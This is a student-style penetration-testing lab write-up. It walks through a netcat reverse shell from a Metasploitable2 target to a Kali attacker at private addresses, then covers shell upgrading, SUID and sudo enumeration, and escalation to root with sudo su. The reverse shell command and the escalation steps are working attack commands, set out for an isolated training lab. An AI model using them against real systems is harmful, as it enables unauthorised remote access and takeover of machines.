# Netcat Reverse Shell + Privilege Escalation Lab

## Objective
Simulate a reverse shell attack from a Kali Linux attacker machine to a Metasploitable target and escalate privileges to root.

---

## Lab Environment

| Role     | Machine          | IP Address       |
|----------|------------------|------------------|
| Attacker | Kali Linux       | 192.168.0.142    |
| Target   | Metasploitable2  | 192.168.0.108    |

---

## Step 1: Start Listener (Kali)

```bash
nc -lvnp 4444

Step 2: Trigger Reverse Shell (Target)
nc -e /bin/bash 192.168.0.142 4444

Step 3: Upgrade Shell
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg

Step 4: Enumeration
whoami
id
sudo -l
find / -perm -4000 -type f 2>/dev/null

Step 5: Privilege Escalation
sudo su
Verification
whoami
id

Expected output:

root
uid=0(root)
Key Concepts Learned
Reverse shell behavior (target → attacker)
Netcat usage for remote command execution
Shell stabilization techniques
Privilege escalation via sudo misconfiguration
Importance of enumeration
Troubleshooting Notes
/dev/tcp method may fail depending on shell support
nc -e may not exist on all systems
Terminal may break after stty raw -echo → fix with reset or stty sane

Always verify connectivity with:

nc -vz <attacker_ip> <port>
Reflection

This lab demonstrates a complete attack chain:

Initial access
Shell stabilization
System enumeration
Privilege escalation

This mirrors real-world penetration testing workflows.`

